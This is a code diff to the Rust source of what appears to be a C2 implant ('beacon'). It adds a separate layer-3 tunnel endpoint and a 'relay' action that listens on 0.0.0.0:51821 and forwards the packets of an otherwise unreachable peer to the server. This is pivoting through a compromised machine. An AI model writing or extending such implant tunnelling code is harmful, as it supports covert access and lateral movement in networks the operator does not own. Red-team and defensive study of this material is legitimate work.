@@ -357,6 +357,9 @@ pub struct Context {
     pub agent_id: String,
     /// The C2 address ("host:port").
     pub server: String,
+    /// The endpoint of the layer-3 tunnel ("host:port"), if the beacon
+    /// knows one.  The tunnel is a transport of its own.
+    pub vpn_addr: String,
     /// Whether the implant prints what it is doing.
     pub verbose: bool,
 }
@@ -1263,17 +1266,43 @@ fn peer_pid(args: &Value) -> Option<u32> {
 /// Join the layer-3 tunnel.
 fn start_vpn(ctx: &Context, args: &Value) -> Outcome {
     let action = args.str_or("action", "start");
+    if action == "relay" {
+        // The relay carries the packets of a peer that can only be
+        // reached through this agent.  The keys of the session stay
+        // between the peer and the server.
+        let server = {
+            let explicit = args.str_or("addr", "");
+            if explicit.is_empty() {
+                ctx.vpn_addr.clone()
+            } else {
+                explicit
+            }
+        };
+        if server.is_empty() {
+            return Outcome::err(1, "the relay needs an endpoint (addr or --vpn)");
+        }
+        let listen = args.str_or("listen", "0.0.0.0:51821");
+        let context = ctx.clone();
+        thread::spawn(move || {
+            let _ = crate::vpn::relay(&server, &listen, context.verbose);
+        });
+        return Outcome::ok(format!("vpn relay on {listen}\n").into_bytes())
+            .with("listen", upk::s(&listen));
+    }
     if action != "start" {
         return Outcome::ok(format!("vpn {action}\n").into_bytes());
     }
     let server = {
         let explicit = args.str_or("addr", "");
         if explicit.is_empty() {
-            ctx.server.clone()
+            ctx.vpn_addr.clone()
         } else {
             explicit
         }
     };
+    if server.is_empty() {
+        return Outcome::err(1, "the tunnel needs an endpoint (addr or --vpn)");
+    }
     let context = ctx.clone();
     let (tx, rx) = mpsc::channel::<String>();
     thread::spawn(move || {
